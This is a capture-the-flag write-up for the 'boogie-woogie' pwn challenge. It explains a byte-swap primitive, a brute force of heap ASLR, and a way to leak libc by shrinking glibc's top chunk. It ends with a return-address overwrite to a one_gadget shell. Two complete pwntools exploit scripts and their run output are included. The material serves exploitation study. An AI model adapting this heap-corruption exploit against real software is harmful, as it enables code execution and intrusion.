
## code overview

boogie-woogie is a fairly simple program 

```c
000011a9  void* clap(int64_t arg1, int64_t arg2)

000011eb      *(arg1 + &data) = *(arg1 + &data) ^ *(arg2 + &data)
0000121f      *(arg2 + &data) = *(arg2 + &data) ^ *(arg1 + &data)
00001253      *(arg1 + &data) = *(arg1 + &data) ^ *(arg2 + &data)
00001257      return arg1 + &data

00001258  int32_t main(int32_t argc, char** argv, char** envp)

00001264      void* fsbase
00001264      int64_t rax = *(fsbase + 0x28)
0000127d      puts(str: &__art)
0000128c      puts(str: "\x1b[0;33mEven this cursed spiri…")
00001303      while (data != 0)
00001293          int64_t var_18 = 0
000012b4          printf(format: "\n\x1b[31;49;1;4m%s\x1b[0m\n\n\n", &data)
000012c3          puts(str: "The sound of \x1b[0;33mgion shoj…")
000012e2          int64_t var_20
000012e2          __isoc99_scanf(format: "%zu %zu", &var_20, &var_18)
000012f5          clap(var_20, var_18)
0000130e      *(fsbase + 0x28)
00001317      if (rax == *(fsbase + 0x28))
0000131f          return 0
00001319      __stack_chk_fail()
00001319      noreturn

```

```
❯ checksec boogie-woogie
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```


```
.data (PROGBITS) section started  {0xf000-0xf0b7}
0000f000  __data_start:
0000f000  00 00 00 00 00 00 00 00                                                                          ........

0000f008  void* __dso_handle = __dso_handle

0000f010                                                  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                  ................

0000f020  char data[0x97] = "Listen closely, cursed spirit. There is no way you do not know this. An arm is\n"
0000f020      "merely a decoration. The act of applause is an acclamation of the soul!", 0
.data (PROGBITS) section ended  {0xf000-0xf0b7}
.bss (NOBITS) section started  {0xf0b7-0xf0b8}
0000f0b7  char __bss_start = 0x0
.bss (NOBITS) section ended  {0xf0b7-0xf0b8}


```

Simple in this case means that it's easy to understand and very difficult to solve. We have the ability to swap bytes relative to the program base but... there isn't really much there.  

<blockquote class='callout info' data-callout="info">

<div class="callout-title">

<div class="callout-icon"></div>
<div class="callout-title-inner">__dso_handle?</div>
</div>
tl;dr its just a uuid lol
<br>

it is initialized at runtime to a recursive pointer (PIE + 0xf008) and is used to filter which atexit functions run when an object is unloaded. It is a pointer because it is implicitly unique but it is never dereferenced.

</blockquote>

I was stuck at this point for a long time -- we had an obvious and fairly strong primitive but nothing to do with it.  This challenge is running under ASLR so we don't know the location of any memory segments (besides the program itself, which can be leaked from `__dso_handle`).  
## wait where's the heap?

```
gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x000055f39d069000 0x000055f39d06a000 0x0000000000001000 0x0000000000000000 r-- /app/boogie-woogie
0x000055f39d06a000 0x000055f39d06b000 0x0000000000001000 0x0000000000001000 r-x /app/boogie-woogie
0x000055f39d06b000 0x000055f39d077000 0x000000000000c000 0x0000000000002000 r-- /app/boogie-woogie
0x000055f39d077000 0x000055f39d078000 0x0000000000001000 0x000000000000d000 r-- /app/boogie-woogie
0x000055f39d078000 0x000055f39d079000 0x0000000000001000 0x000000000000e000 rw- /app/boogie-woogie
0x000055f39de0e000 0x000055f39de2f000 0x0000000000021000 0x0000000000000000 rw- [heap]  <-  $rsi, $r9
```

Not all areas of memory are randomized the same way.  The offset between .data and the heap is randomized by ASLR but it's not.... that... random?  I knew from staring at memory maps that it was always in the same general area, tested it experimentally with gdb, and then after the fact looked it up in the kernel source code.  The heap on x86/64 Linux starts between 0 and 8192 pages after the end of the program (in the no-aslr case this is always 0; it starts directly after the program). 


```c
// https://elixir.bootlin.com/linux/latest/source/fs/binfmt_elf.c#L1254
if ((current->flags & PF_RANDOMIZE) && (randomize_va_space > 1)) {
	/*
	 * For architectures with ELF randomization, when executing
	 * a loader directly (i.e. no interpreter listed in ELF
	 * headers), move the brk area out of the mmap region
	 * (since it grows up, and may collide early with the stack
	 * growing down), and into the unused ELF_ET_DYN_BASE region.
	 */
	if (IS_ENABLED(CONFIG_ARCH_HAS_ELF_RANDOMIZE) &&
		elf_ex->e_type == ET_DYN && !interpreter) {
		mm->brk = mm->start_brk = ELF_ET_DYN_BASE;
	}

	mm->brk = mm->start_brk = arch_randomize_brk(mm);
#ifdef compat_brk_randomized
	current->brk_randomized = 1;
#endif
}

// https://elixir.bootlin.com/linux/v6.7.4/source/arch/x86/kernel/process.c#L1031
unsigned long arch_randomize_brk(struct mm_struct *mm)
{
	return randomize_page(mm->brk, 0x02000000);
}

// https://elixir.bootlin.com/linux/v6.7.4/source/mm/util.c#L338
/**
 * randomize_page - Generate a random, page aligned address
 * @start:	The smallest acceptable address the caller will take.
 * @range:	The size of the area, starting at @start, within which the
 *		random address must fall.
 *
 * If @start + @range would overflow, @range is capped.
 *
 * NOTE: Historical use of randomize_range, which this replaces, presumed that
 * @start was already page aligned.  We now align it regardless.
 *
 * Return: A page aligned address within [start, start + range).  On error,
 * @start is returned.
 */
unsigned long randomize_page(unsigned long start, unsigned long range)
{
	if (!PAGE_ALIGNED(start)) {
		range -= PAGE_ALIGN(start) - start;
		start = PAGE_ALIGN(start);
	}

	if (start > ULONG_MAX - range)
		range = ULONG_MAX - start;

	range >>= PAGE_SHIFT;

	if (range == 0)
		return start;

	return start + (get_random_long() % range << PAGE_SHIFT);
}

```

To be quite honest this is enough on it's own.  A 1-in-8192 brute isn't exactly fast but frankly I've done stupider things for a flag than a three hour brute (sry not sry infra; someone actually took it down doing this and got a POW added).  

In the end though there was a pretty easy optimization that could cut that down to merely a couple hundred throws.  The heap is (in this program, at the current state) 33 pages long and all we need to do is land somewhere inside the heap.   Once we know a valid heap offset, we can walk back until the  tcache perthread header is found -- bringing an 1/8192 chance down to 1/250-ish. 


```python
#!/usr/bin/env python3

from pwn import *

e = ELF("boogie-woogie")

context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "zsh", "-c"]
context.binary = e


@context.quietfunc
def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
        r = gdb.debug([e.path])
    else:
        r = remote("localhost", 5000)

    return r


def main():
    def brute_heap_offset():
        idx = 0
        with log.progress('Bruting') as p:
            while True:
                try:
                    idx += 1
                    p.status("attempt %i", idx)
                    r = conn()
                    r.recvuntil(b"exception")
                    trial_heap_offset = 0x1995fe0
                    # trial_heap_offset = 0x1000 # lol testing without aslr
                    
                    r.sendline(f"1 {trial_heap_offset}".encode())
                    
                    r.recvuntil(b"exception")
                    r.sendline(f"1 {trial_heap_offset}".encode())
                    p.success()
                    return (r, trial_heap_offset >> 12 << 12)
                except EOFError:
                    with context.local(log_level='error'): r.close()


    r, heap_page = brute_heap_offset()


    def leak_relative_ptr(b):
        for x in range(8):
            r.sendline(f"{b+x} {1+x}".encode())

        for _ in range(8):
            r.readuntil(b"exception:")
        r.readuntil(b"4m")
        r.recvuntil(b"L")
        ptr = u64(r.read(6).ljust(8,b"\x00"))
        for x in range(8):
            r.sendline(f"{b+x} {1+x}".encode())

        for _ in range(8):
            r.readuntil(b"exception:")
        return ptr


    __dso_handle = leak_relative_ptr(-24)
    e.address =  __dso_handle - e.symbols['__dso_handle']
    log.info(f'__dso_handle = {hex(__dso_handle)}')
    log.info(f"program base = {hex(e.address)}")
    log.info(f"offset to a heap page = {hex(heap_page)}")
    maybe_tcache_perthread = heap_page + 8 - 0x20
    r.readuntil(b"exception:")
    while True:
        r.sendline(f"1 {maybe_tcache_perthread}".encode())
        r.recvuntil(b"L")
        if r.recv(1) == b'\x91':
            r.readuntil(b"exception:")
            break
        r.readuntil(b"exception:")
        maybe_tcache_perthread -= 0x1000
    heap_base = maybe_tcache_perthread - 0x8
    log.info(f"offset to heap base = {hex(heap_base)}")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

## manifesting a libc pointer in the heap

So, what now?

```
gef> scan heap libc
[+] Searching for addresses in 'heap' that point to 'libc'
gef> 
```

well that sucks lmao

Usually it's fairly straightforward to get pointers into libc in the heap.  Free a chunk into unsorted bins and either side of the free list will be pointing at main_arena in libc.  

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1926
static struct malloc_state main_arena =
{
  .mutex = _LIBC_LOCK_INITIALIZER,
  .next = &main_arena,
  .attached_threads = 1
};


// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1541
#define bin_at(m, i) \
  (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))			      \
             - offsetof (struct malloc_chunk, fd))


// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1680
#define unsorted_chunks(M)          (bin_at (M, 1))

// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4627
bck = unsorted_chunks(av);
fwd = bck->fd;
if (__glibc_unlikely (fwd->bk != bck))
	malloc_printerr ("free(): corrupted unsorted chunks");
p->fd = fwd;
p->bk = bck;
```

Unfortunately, in this case we don't have much ability to work with the heap in this binary.  There is (as far as I'm aware) a single relevant primitive -- scanf [allocates a scratch buffer](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfscanf-internal.c#L336) and then frees it at the end.  However, the lifetime of this chunk (allocated, used, freed) usually just means it gets consolidated against the predecessor chunk (top chunk in this case). 

So, then, how can we prevent this consolidation?  We don't have enough control over the ordering of the heap chunks to prevent it from consolidating naturally -- but we do have a very strong write primitive.  Can the heap be corrupted in such a way so as to prevent consolidation? Keeping in mind that we have no control between the allocation and corresponding free?

There isn't really much on the heap to work with but the first place to look is the top chunk -- where our allocated chunk is split off from and then consolidated against.  

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4353
use_top:
  /*
	 If large enough, split off the chunk bordering the end of memory
	 (held in av->top). Note that this is in accord with the best-fit
	 search rule.  In effect, av->top is treated as larger (and thus
	 less well fitting) than any other available chunk since it can
	 be extended to be as large as necessary (up to system
	 limitations).

	 We require that av->top always exists (i.e., has size >=
	 MINSIZE) after initialization, so if it would otherwise be
	 exhausted by current request, it is replenished. (The main
	 reason for ensuring it exists is that we may need MINSIZE space
	 to put in fenceposts in sysmalloc.)
   */

  victim = av->top;
  size = chunksize (victim);

  if (__glibc_unlikely (size > av->system_mem))
	malloc_printerr ("malloc(): corrupted top size");

  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
	{
	  remainder_size = size - nb;
	  remainder = chunk_at_offset (victim, nb);
	  av->top = remainder;
	  set_head (victim, nb | PREV_INUSE |
				(av != &main_arena ? NON_MAIN_ARENA : 0));
	  set_head (remainder, remainder_size | PREV_INUSE);

	  check_malloced_chunk (av, victim, nb);
	  void *p = chunk2mem (victim);
	  alloc_perturb (p, bytes);
	  return p;
	}

  /* When we are using atomic ops to free fast chunks we can get
	 here for all block sizes.  */
  else if (atomic_load_relaxed (&av->have_fastchunks))
	{
	  malloc_consolidate (av);
	  /* restore original bin index */
	  if (in_smallbin_range (nb))
		idx = smallbin_index (nb);
	  else
		idx = largebin_index (nb);
	}

  /*
	 Otherwise, relay to handle system-dependent cases
   */
  else
	{
	  void *p = sysmalloc (nb, av);
	  if (p != NULL)
		alloc_perturb (p, bytes);
	  return p;
	}
```

There are two cases when allocating a chunk without pulling from the bins.  If the top chunk has sufficient size then a chunk is split off from the top chunk.  Otherwise, it will call into sysmalloc to handle "system-dependent cases". 

Sysmalloc has a lot of weird alternate cases!  Allocations of sufficient size (sufficient size being a sliding scale, starts at 128k bytes and caps at 4mb on amd64 libc 2.35) are fulfilled with mmap.  If needed, it will attempt to use sbrk to extend the length of the heap.  The key to our problem lies in how malloc handles an edge case involving the heap extension -- new heap pages which are not not contiguous with the old heap (either because the address space is noncontiguous or because non-libc code called sbrk).  In such a case malloc will skip over that segment, create a new top chunk, and then *prevent consolidation and free the old top chunk*.  

```c
 /*
	 If not the first time through, we either have a
	 gap due to foreign sbrk or a non-contiguous region.  Insert a
	 double fencepost at old_top to prevent consolidation with space
	 we don't own. These fenceposts are artificial chunks that are
	 marked as inuse and are in any case too small to use.  We need
	 two to make sizes and alignments work out.
   */

  if (old_size != 0)
	{
	  /*
		 Shrink old_top to insert fenceposts, keeping size a
		 multiple of MALLOC_ALIGNMENT. We know there is at least
		 enough space in old_top to do this.
	   */
	  old_size = (old_size - 2 * CHUNK_HDR_SZ) & ~MALLOC_ALIGN_MASK;
	  set_head (old_top, old_size | PREV_INUSE);

	  /*
		 Note that the following assignments completely overwrite
		 old_top when old_size was previously MINSIZE.  This is
		 intentional. We need the fencepost, even if old_top otherwise gets
		 lost.
	   */
set_head (chunk_at_offset (old_top, old_size),
CHUNK_HDR_SZ | PREV_INUSE);
set_head (chunk_at_offset (old_top,
		 old_size + CHUNK_HDR_SZ),
CHUNK_HDR_SZ | PREV_INUSE);

	  /* If possible, release the rest. */
	  if (old_size >= MINSIZE)
		{
		  _int_free (av, old_top, 1);
		}
	}
```

This is very promising, but we don't have the ability to actually call force sbrk to return a noncontiguous page right?  The answer is no -- but it's actually unnecessary! Contiguity is checked naively -- the old heap end is computed based off the top chunk + top chunk size. 

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2606
old_top = av->top;
old_size = chunksize (old_top);
old_end = (char *) (chunk_at_offset (old_top, old_size));
// ...
// https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547
if (brk == old_end && snd_brk == (char *) (MORECORE_FAILURE)) {
// ...
} else {
// handles noncontiguous sbrk
}
```

We don't need to force sbrk to return a noncontiguous page -- just convince malloc that it did do so.  By using our byte swap primitive to shrink the size of the top chunk (from 0x20550 to 0x550) and then making an allocation larger than the new top chunk size (which extends the heap) we end up with the old top chunk in an unsorted bin with two pointers to libc present. 

```python
top_chunk = heap_base + 0x0ab8
r.sendline(f"-3 {top_chunk+2}")
r.sendline(b"-1 -"+b"1"*0x800)
```

```
gef> heap bins
Unsorted Bin for arena 'main_arena' 
-----------------------------------------------------------
unsorted_bin[idx=0, size=any, @0x7ffff7faacf0]: fd=0x555555564ab0, bk=0x555555564ab0
 -> Chunk(addr=0x555555564ab0, size=0x530, flags=PREV_INUSE, fd=0x7ffff7faace0, bk=0x7ffff7faace0)
[+] Found 1 valid chunks in unsorted bin.
```

```
gef> scan heap libc
[+] Searching for addresses in 'heap' that point to 'libc'
[heap]: 0x0000555555564ac0  ->  0x00007ffff7faace0  ->  0x0000555555585000  ->  0x0000000000000000
[heap]: 0x0000555555564ac8  ->  0x00007ffff7faace0  ->  0x0000555555585000  ->  0x0000000000000000
gef> 
```
## win

With arbitrary write (ish -- its a swap but we could put arb bytes in the stdin buffer if needed) it's basically over.  I chose to replace a saved return address (and rbp, as rbp-0x78 needed to be writable) with a one gadget.

gg fun challenge :)

```
❯ python3 solve.py
[+] Bruting: Done
[*] __dso_handle = 0x55d54865f008
[*] program base = 0x55d548650000
[*] offset to a heap page = 0x1995000
[*] offset to heap base = 0x1986fe0
[*] libc.address = 0x7f89e407e000
[*] stack address (main saved ret) = 0x7ffc792a8688
[*] one_gadget = 0x7f89e4169c88
[+] Receiving all data: Done (9B)
[*] Closed connection to localhost port 5000
b' dice{i7_S33MS_sOm3BODY_cOOK3D_h3r3_8ff4c343}\r\n'
```

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("boogie-woogie")
libc = ELF("./libc.so.6")
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "zsh", "-c"]
context.binary = e


@context.quietfunc
def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
        r = gdb.debug([e.path])
    else:
        r = remote("localhost", 5000)

    return r


def main():
    def brute_heap_offset():
        idx = 0
        with log.progress('Bruting') as p:
            while True:
                try:
                    idx += 1
                    p.status("attempt %i", idx)
                    r = conn()
                    r.recvuntil(b"exception")
                    trial_heap_offset = 0x1995fe0
                    # trial_heap_offset = 0x1000 # lol testing without aslr
                    
                    r.sendline(f"1 {trial_heap_offset}".encode())
                    
                    r.recvuntil(b"exception")
                    r.sendline(f"1 {trial_heap_offset}".encode())
                    p.success()
                    return (r, trial_heap_offset >> 12 << 12)
                except EOFError:
                    with context.local(log_level='error'): r.close()


    r, heap_page = brute_heap_offset()


    def leak_relative_ptr(b):
        for x in range(8):
            r.sendline(f"{b+x} {1+x}".encode())

        for _ in range(8):
            r.readuntil(b"exception:")
        r.readuntil(b"4m")
        r.recvuntil(b"L")
        ptr = u64(r.read(6).ljust(8,b"\x00"))
        for x in range(8):
            r.sendline(f"{b+x} {1+x}".encode())

        for _ in range(8):
            r.readuntil(b"exception:")
        return ptr


    __dso_handle = leak_relative_ptr(-24)
    e.address =  __dso_handle - e.symbols['__dso_handle']
    log.info(f'__dso_handle = {hex(__dso_handle)}')
    log.info(f"program base = {hex(e.address)}")
    log.info(f"offset to a heap page = {hex(heap_page)}")
    maybe_tcache_perthread = heap_page + 8 - 0x20
    r.readuntil(b"exception:")
    while True:
        r.sendline(f"1 {maybe_tcache_perthread}".encode())
        r.recvuntil(b"L")
        if r.recv(1) == b'\x91':
            r.readuntil(b"exception:")
            break
        r.readuntil(b"exception:")
        maybe_tcache_perthread -= 0x1000
    heap_base = maybe_tcache_perthread - 0x8
    log.info(f"offset to heap base = {hex(heap_base)}")
    top_chunk = heap_base + 0x0ab8
    r.sendline(f"-3 {top_chunk+2}".encode())
    r.sendline(b"-1 -"+b"1"*0x800)

    libc.address = leak_relative_ptr(top_chunk+8) - 0x21ace0

    def leak_absolute_ptr(ptr):
        return leak_relative_ptr(ptr - e.symbols['data'])

    def swap_absolute_str(addr_a, addr_b):
        return f"{addr_a-e.symbols['data']} {addr_b-e.symbols['data']}".encode()    

    log.info(f"libc.address = {hex(libc.address)}")
    stack_ret_address = leak_absolute_ptr(libc.symbols['environ']) - 0x120
    log.info(f"stack address (main saved ret) = {hex(stack_ret_address)}")
    saved_rbp_address = stack_ret_address - 8
    one_gadget = libc.address + 0xebc88
    log.info(f"one_gadget = {hex(one_gadget)}")

    one_gadget_bytes = p64(one_gadget)[0:3]
    if len(one_gadget_bytes) != len(set(one_gadget_bytes)):
        log.error(f"lower 3 one gadget bytes must all be unique")

    for i in range(8):
        r.sendline(swap_absolute_str(e.symbols['data']+heap_base+0xac0+i, saved_rbp_address+i))

    # writable=True was giving me r sections smh manually check that
    r.sendline(swap_absolute_str(stack_ret_address, next(x for x in libc.search(one_gadget_bytes[0],writable=True) if x > libc.address+0x21a000)))
    r.sendline(swap_absolute_str(stack_ret_address+1, next(x for x in libc.search(one_gadget_bytes[1],writable=True) if x > libc.address+0x21a000)))
    r.sendline(swap_absolute_str(stack_ret_address+2, next(x for x in libc.search(one_gadget_bytes[2],writable=True) if x > libc.address+0x21a000)))
    
    r.sendline(b"0 0")
    r.sendline(b"cat flag.txt;exit")
    r.recvuntil(b"$")
    print(r.recvall())
    # dice{i7_S33MS_sOm3BODY_cOOK3D_h3r3_8ff4c343}
    # good luck pwning :)

    # r.interactive()


if __name__ == "__main__":
    main()

```
